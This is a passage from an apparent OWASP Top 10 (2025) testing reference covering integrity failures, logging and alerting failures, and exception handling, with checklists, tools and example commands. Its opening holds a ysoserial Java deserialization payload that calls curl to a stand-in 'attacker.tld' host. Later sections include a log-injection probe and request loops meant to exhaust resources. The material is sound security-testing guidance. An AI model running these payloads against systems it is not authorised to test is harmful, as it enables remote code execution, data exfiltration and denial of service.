# Build a Java deserialization payload (lab only, against your own app)
java -jar ysoserial-all.jar CommonsCollections6 'curl http://attacker.tld/$(whoami)' | base64

# Send the payload as a Java serialized cookie or body
curl -X POST -H "Content-Type: application/x-java-serialized-object" \
  --data-binary "@payload.bin" https://app.example.com/api/object

# Generate Subresource Integrity hash
curl -s https://cdn.example.com/lib.js | openssl dgst -sha384 -binary | openssl base64 -A

# Verify a container image signature before deploy
cosign verify --certificate-identity-regexp '.*@myorg\.com' \
              --certificate-oidc-issuer 'https://token.actions.githubusercontent.com' \
              ghcr.io/myorg/app:1.4.2
```

### What "passing" looks like

- Every artifact (container, package, binary) is signed at build and verified at deploy.
- No unsafe deserialization sinks; safe alternatives (JSON, MessagePack) used by default; allow-listed types only for legacy serialization.
- All external scripts use SRI; no `<script src="...">` without `integrity`.
- CI/CD has separation of duties, signed commits, signed releases, and a tamper-evident audit trail.
- Auto-update verifies signature against a hardware-protected publisher key.
- Cookies and tokens carrying state are signed (HMAC) or encrypted, with verification on every read.

### Mapping

- CWE-345 (Insufficient Verification of Data Authenticity)
- CWE-353, CWE-426 (Untrusted Search Path), CWE-494 (Download of Code Without Integrity Check)
- CWE-502 (Deserialization of Untrusted Data), CWE-565, CWE-784, CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
- CWE-830, CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)
- Related: OWASP API Security Top 10 — API8 Security Misconfiguration (when affecting integrity), API10. OWASP Mobile Top 10 — M7 Insufficient Binary Protection.

---

## A09:2025 — Security Logging and Alerting Failures

### Definition

A09 covers failures in security logging and alerting. Without sufficient logs, attacks and breaches cannot be detected. Without alerting, response is slow or absent. The 2025 dataset highlights multi-year breaches that went undetected purely because logging and monitoring were not in place.

### Common attack vectors

- Auditable events (login, MFA, role change, money movement, data export) not logged.
- Logs missing context: no user ID, no request ID, no source IP, no timestamp with timezone.
- Logs stored only locally on the same host that was compromised.
- Logs writable by the application (no append-only, no integrity protections), so attackers can edit.
- Sensitive data written to logs (passwords, tokens, full PANs, full PII).
- No alerting on suspicious patterns (impossible travel, mass failed logins, privileged action spikes).
- No incident response playbook, no on-call, no rehearsal.
- Logs not retained long enough to investigate (legal minimums vary; many breaches dwell 200+ days).
- Log injection: attacker-controlled input written verbatim, allowing forging entries.

### How to test

Manual checklist:

- [ ] Define a minimum auditable event set (auth, authz failures, money movement, export, admin actions, config changes).
- [ ] Trigger each event and confirm a log line with user, action, resource, result, IP, request ID, timestamp.
- [ ] Try log injection: submit `\n[admin] login success` in a username field and read the log.
- [ ] Confirm logs are shipped off-host, append-only, and integrity-protected.
- [ ] Review alerting rules; test by triggering a known pattern and confirming the alert fires.
- [ ] Run a tabletop incident-response exercise once per quarter.
- [ ] Verify retention windows meet legal/regulatory floors (GDPR, PCI DSS, HIPAA, SOX).

Automated approach: synthetic events that should always fire alerts, run on a schedule; Detection-as-Code in tools like Sigma or Datadog; chaos drills.

### Tools

- ELK (Elasticsearch + Logstash + Kibana), OpenSearch, Loki + Grafana
- Splunk, Datadog, Sumo Logic, New Relic
- Sigma rules, Falco for runtime, OSQuery for endpoint, Wazuh for HIDS
- AWS CloudTrail + GuardDuty + Security Hub, Azure Sentinel, GCP Security Command Center
- `auditd`, `journald`, `osquery`
- IR playbook tooling: TheHive, Cortex, Shuffle (SOAR)

### Example payloads / commands

```bash
# Trigger an auditable event and confirm log presence (after action)
curl -i -u admin:wrong https://app.example.com/api/login
# Then, in your SIEM:
#   index=app source="auth" event="login_failed" user="admin"

# Log injection probe
curl "https://app.example.com/api/login?user=alice%0A%5Badmin%5D%20login%20success"

# Confirm append-only ship-off (file should be append-only on host)
lsattr /var/log/app/audit.log
# expected: -----a-------e--

# Synthetic alert test (forces a rule)
seq 1 50 | xargs -I{} curl -s -o /dev/null -X POST \
  -d '{"user":"alice","pass":"wrong"}' https://app.example.com/api/login
```

### What "passing" looks like

- A documented list of auditable events covers authentication, authorization, money movement, data export, config and role changes.
- Every log line contains user, action, resource, result, IP, request ID, timezone-aware timestamp.
- Logs are shipped to a tamper-evident, append-only store with retention aligned to legal minimums.
- Alerts exist for high-value patterns, are tested by synthetic events, and route to a real on-call.
- Incident response playbooks exist, are versioned, and are exercised at least quarterly.
- Sensitive data is redacted at log time; secret scanners verify logs do not leak credentials.

### Mapping

- CWE-117 (Improper Output Neutralization for Logs)
- CWE-221 (Information Loss or Omission)
- CWE-223 (Omission of Security-Relevant Information)
- CWE-532 (Insertion of Sensitive Information into Log File)
- CWE-778 (Insufficient Logging)
- Related: OWASP API Security Top 10 — API9 Improper Inventory Management (visibility gap), API10. OWASP Mobile Top 10 — M10 Insufficient Cryptography/Logging exposure.

---

## A10:2025 — Mishandling of Exceptional Conditions

### Definition

Mishandling exceptional conditions in software happens when programs fail to prevent, detect, and respond to unusual and unpredictable situations, leading to crashes, unexpected behavior, and sometimes vulnerabilities. New for 2025, this category isolates the security impact of bad error handling: resource exhaustion, information disclosure, and corrupted business state.

### Common attack vectors

- Resource exhaustion: an exception path leaks file handles, DB connections, threads, or memory; repeated triggering exhausts the system (DoS).
- Information disclosure via stack traces: error responses leak framework version, file paths, SQL fragments, internal IPs.
- Business-state corruption: a multi-step transaction fails mid-way without rollback, leaving an inconsistent state attackers exploit (double-spend, half-fulfilled orders).
- Catch-all `try/except: pass` swallowing security-relevant errors silently.
- Generic exception handling that converts a security failure (auth error) into a success (default user).
- Uncaught exceptions in asynchronous workers terminating retry loops or leaving messages stuck.
- Failure to validate the result of error paths (e.g., `if (free(buf) != 0) ...` style checks missing).

### How to test

Manual checklist:

- [ ] Force every error path: malformed input, oversized input, dependency timeouts, network partition mid-request.
- [ ] Inspect the response: is it generic to the user, detailed in the server log?
- [ ] Confirm transactional rollback under failure: query the database after a forced mid-transaction error.
- [ ] Run resource-leak tests: trigger the error path 10K times and watch FDs, threads, memory.
- [ ] Inject chaos at dependencies (DB, cache, queue) and observe behavior.
- [ ] Audit code for empty `catch` blocks, broad `except Exception`, and missing `finally`/`with`.

Automated approach: chaos engineering on staging, fault injection in tests (Toxiproxy, `pumba`, AWS Fault Injection Simulator), property-based tests targeting error paths, SAST rules for empty catch blocks.

### Tools

- Chaos: Toxiproxy, `pumba`, Chaos Mesh, Gremlin, AWS FIS
- Static analysis: `semgrep --config p/security-audit`, SonarQube `S108`/`S2737`, CodeQL `java/empty-catch-block`
- Dynamic: ZAP fuzzer, Burp Intruder with malformed payloads
- Resource-leak monitoring: `prometheus` + `node_exporter`, `pidstat`, `lsof`
- Transaction inspection: DB-side audit columns, application tracing (OpenTelemetry)

### Example payloads / commands

```bash
# Force malformed input across endpoints
ffuf -u 'https://app.example.com/api/items?id=FUZZ' \
     -w wordlists/oversize-and-malformed.txt -mc all

# Mid-transaction interruption (Toxiproxy on the DB)
toxiproxy-cli toxic add -t latency -a latency=10000 db_proxy
# Issue a multi-step transaction request and check DB state for partial writes

# Detect empty catch blocks
semgrep --config p/security-audit --include '*.java' --include '*.cs' --include '*.py' .

# Resource-leak watch
ulimit -n 1024
# Then loop the error endpoint 10000 times
for i in $(seq 1 10000); do curl -s -o /dev/null https://app.example.com/api/broken; done
lsof -p $APP_PID | wc -l

# Verbose error probe
curl -s 'https://app.example.com/api/items?id=' | grep -iE 'stack|trace|at .*\(.*\.java|line [0-9]+'
```

### What "passing" looks like

- All exception handlers either recover meaningfully or fail closed and surface a generic message; nothing silently swallows errors.
- Every multi-step transaction rolls back atomically on error; tests prove it.
- Resource handles use language idioms that guarantee cleanup (`try-with-resources`, `with`, `defer`, RAII).
- Error responses to clients are generic; full traces only in centralized logs.
- Chaos and fault-injection tests run on every release candidate; resource leaks are caught before production.
- Global exception handlers exist at framework boundaries (HTTP handlers, message consumers, schedulers).

### Mapping

- CWE-209 (Generation of Error Message Containing Sensitive Information)
- CWE-234, CWE-248 (Uncaught Exception)
- CWE-274, CWE-390 (Detection of Error Condition Without Action)
- CWE-391 (Unchecked Error Condition), CWE-392, CWE-393, CWE-394, CWE-395, CWE-396, CWE-397
- CWE-460, CWE-476 (NULL Pointer Dereference), CWE-544, CWE-636 (Not Failing Securely)
- CWE-703 (Improper Check or Handling of Exceptional Conditions), CWE-754 (Improper Check for Unusual or Exceptional Conditions), CWE-755 (Improper Handling of Exceptional Conditions)
- Related: OWASP API Security Top 10 — API4 Unrestricted Resource Consumption (when caused by leaks). OWASP Mobile Top 10 — M4 Insufficient Input/Output Validation.

---

## Cross-cutting recommendations

- Treat this list as a baseline, not a ceiling. Pair it with OWASP ASVS for a per-control verification standard, and with the OWASP Cheat Sheet Series for hardened implementation guidance.
- Run SAST, SCA, and secret scanning on every PR. Run DAST on every staging deploy. Run an authenticated DAST and a manual penetration test on every release candidate.
- Encode security acceptance criteria into user stories. If it is not in the definition of done, it is not done.
- Capture every finding in your defect tracker with CWE, CVSS, and affected components. Track time-to-fix as a core engineering KPI.
- Re-assess this reference whenever OWASP publishes an update; the 2025 list is current as of this document's review date but the official text and ordering can change.
